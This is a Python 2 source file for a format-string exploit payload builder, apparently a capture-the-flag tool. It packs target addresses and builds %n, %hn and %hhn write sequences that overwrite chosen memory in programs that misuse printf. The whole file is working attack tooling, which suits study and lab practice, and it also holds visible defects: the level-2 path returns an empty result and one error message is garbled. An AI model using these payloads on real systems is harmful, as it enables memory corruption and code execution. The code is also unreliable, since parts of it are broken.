import struct

bytes_classes = (bytes, str, bytearray)


def p64(x):
    return struct.pack('<Q', x)

def u64(x):
    return struct.unpack('<Q', x)[0]

def u32(x):
    return struct.unpack('<I', x)[0]

def u16(x):
    return struct.unpack('<H', x)[0]

class PercentN(object):
    write_chars = None
    index = None
    level = None

    def __init__(self, level):
        self.level = level
        if self.level == 2:
            self.write_chars = "%xxxxx$n"
        elif self.level == 1:
            self.write_chars = "%xxxx$hn"
        elif self.level == 0:
            self.write_chars = "%xxx$hhn"


    def __str__(self):
        if self.index is not None:
            if self.level == 2:
                return self.write_chars.replace("xxxxx", str(self.index).rjust(5, "0"))
            elif self.level == 1:
                return self.write_chars.replace("xxxx", str(self.index).rjust(4, "0"))
            elif self.level == 0:
                return self.write_chars.replace("xxx", str(self.index).rjust(3, "0"))
        return self.write_chars

class Fmt(object):
    offset = None
    written = 0

    # Raw address/value key-value
    targets = {}
    # Processed address/value key-value
    table = {}
    payload = None

    def __init__(self, offset=None, written=0):
        self.offset = offset
        self.written = written

    # Stores the raw address and values to self.target
    def __setitem__(self, address, val):
        self.targets[address] = val

    # Since new class PercentN is used, we need 2 more functions to apply len() and join()
    def get_length_to_concat(self, concat_list):
        length = 0
        for item in concat_list:
            if type(item) is str:
                length += len(item)
            else:
                length += len(str(item))
        return length

    def concat(self, concat_list):
        payload = ""
        for item in concat_list:
            if type(item) is str:
                payload += item
            else:
                payload += str(item)
        return payload

    def optimize(self, to_write, level):
        tmp_to_write = []
        new_to_write = []
        for x in to_write:
            x.append(level)
        if level == 2:
            return sorted(new_to_write, key=(lambda x: x[1]))
        while len(to_write) > 0:
            if len(to_write) == 1:
                tmp_to_write.append(to_write.pop(0))
            else:
                # If current level is 0, check next byte
                if to_write[0][2] == 0 and to_write[0][0] + 1 == to_write[1][0] and to_write[1][1] == 0 and to_write[1][2] == 0:
                    to_write[0][2] = 1
                    to_write.pop(1)
                elif to_write[0][2] == 1 and to_write[0][0] + 2 == to_write[1][0] and to_write[1][1] == 0 and to_write[1][2] == 1:
                    to_write[0][2] = 2
                    to_write.pop(1)
                else:
                    tmp_to_write.append(to_write.pop(0))

        while len(tmp_to_write) > 0:
            if len(tmp_to_write) == 1:
                new_to_write.append(tmp_to_write.pop(0))
            else:
                if tmp_to_write[0][2] == 0 and tmp_to_write[0][0] + 1 == tmp_to_write[1][0] and tmp_to_write[1][1] == 0 and tmp_to_write[1][2] == 0:
                    tmp_to_write[0][2] = 1
                    tmp_to_write.pop(1)
                elif tmp_to_write[0][2] == 1 and tmp_to_write[0][0] + 2 == tmp_to_write[1][0] and tmp_to_write[1][1] == 0 and tmp_to_write[1][2] == 1:
                    tmp_to_write[0][2] = 2
                    tmp_to_write.pop(1)
                else:
                    new_to_write.append(tmp_to_write.pop(0))
        return sorted(new_to_write, key=(lambda x: x[1]))

    # Build final payload
    # level: 0 => hhn   1 byte
    #        1 => hn    2 bytes
    #        2 => n     4 bytes(deprecated)
    def build(self, level=0, debug=False):
        # Clean previous table
        self.table = {}
        # (Re)generate splitted key-value dict
        self.build_table(level)

        # Sort the table in ascending order of value
        to_write = sorted(self.table.items(), key=lambda x: x[0])
        to_write = [list(x) for x in to_write]

        to_write = self.optimize(to_write, level)

        if debug:
            for x in to_write:
                print hex(x[0]), hex(x[1]), x[2]
                pass

        # A list of splitted payload. Concating it is payload.
        to_concat = []

        # copy of the two varibles locally
        tmp_offset = self.offset
        tmp_written = self.written

        # Add %n$c and %n formatters
        for kv_target in to_write:
            level = kv_target[2]
            # If previously printed, calculate num of chars to overflow
            if level == 2:
                num_chars_to_write = (kv_target[1] - tmp_written) & (2 ** 32 - 1)
            elif level == 1:
                num_chars_to_write = (kv_target[1] - tmp_written) & (2 ** 16 - 1)
            elif level == 0:
                num_chars_to_write = (kv_target[1] - tmp_written) & (2 ** 8 - 1)

            # If num is not 0, first use %0n$c to pad
            # Else just use %n to write 0
            if num_chars_to_write != 0:
                print_chars = "{}c".format(num_chars_to_write)
                # Align to 8
                while (len(print_chars) + 2) % 8 != 0:
                    print_chars = "0" + print_chars
                print_chars = "%0" + print_chars
                to_concat.append(print_chars)

            # Add %n formatter
            to_concat.append(PercentN(level))

            # Log how many chars has already been written
            tmp_written += num_chars_to_write


        # A to_concat[i] now is either %n$c or %n
        for i in range(len(to_concat)):
            if type(to_concat[i]) is PercentN:
                to_concat[i].index = self.offset + self.get_length_to_concat(to_concat) / 8
                to_concat.append(p64(to_write.pop(0)[0]))
        # Construct the payload
        self.payload = self.concat(to_concat)
        return self.payload

    def build_table(self, level=0):
        if level == 2:
            print "\033[1;35m[Warning]\033[0m Using %n is likely to fail if value is large therefore is deprecated."
            for address in self.targets:
                if type(self.targets[address]) is str:
                    # If length > int(4 bytes), split them into different numbers
                    if len(self.targets[address]) > 4:
                        tmp_content = self.targets[address]
                        tmp_offset = 0
                        while len(tmp_content) > 4:
                            self.table[address + tmp_offset] = u32(tmp_content[-4:])
                            tmp_content = tmp_content[:-4]
                            tmp_offset += 4
                        self.table[address + tmp_offset] = u32(tmp_content.ljust(4, "\x00"))
                    else:
                        self.table[address] = u32(self.targets[address].ljust(4, "\x00"))
                elif type(self.targets[address]) is int:
                    # If size > int, split them into different numbers
                    if self.targets[address] > (2 ** 32 - 1):
                        tmp_value = self.targets[address]
                        tmp_offset = 0
                        while tmp_value > (2 ** 32 - 1):
                            self.table[address + tmp_offset] = tmp_value % (2 ** 32)
                            tmp_value = tmp_value >> 32
                            tmp_offset += 4
                        self.table[address + tmp_offset] = tmp_value
                    else:
                        self.table[address] = self.targets[address]

        elif level == 1:
            for address in self.targets:
                if type(self.targets[address]) is str:
                    # If length > short(2 bytes), split them into different numbers
                    if len(self.targets[address]) > 2:
                        tmp_content = self.targets[address]
                        tmp_offset = 0
                        while len(tmp_content) > 2:
                            self.table[address + tmp_offset] = u16(tmp_content[:2])
                            tmp_content = tmp_content[2:]
                            tmp_offset += 2
                        self.table[address + tmp_offset] = u16(tmp_content.ljust(2, "\x00"))
                    else:
                        self.table[address] = u16(self.targets[address].ljust(2, "\x00"))
                elif type(self.targets[address]) is int:
                    # If size > short, split them into different numbers
                    if self.targets[address] > (2 ** 16 - 1):
                        tmp_value = self.targets[address]
                        tmp_offset = 0
                        while tmp_value > (2 ** 16 - 1):
                            self.table[address + tmp_offset] = tmp_value % (2 ** 16)
                            tmp_value = tmp_value >> 16
                            tmp_offset += 2
                        self.table[address + tmp_offset] = tmp_value
                    else:
                        self.table[address] = self.targets[address]

        elif level == 0:
            # Split all bytes
            for x in self.targets:
                if type(self.targets[x]) is int:
                    to_write = {(x + i, v) for i, v in enumerate(bytearray(p64(self.targets[x])))}
                elif type(self.targets[x]) in bytes_classes:
                    to_write = {(x + i, v) for i, v in enumerate(bytearray(self.targets[x]))}
                else:
                    raise TypeError('Inself.targets[x]id type of `self.targets[x]`')

                self.table.update(to_write)
        else:
            raise RuntimeError("Level Error")
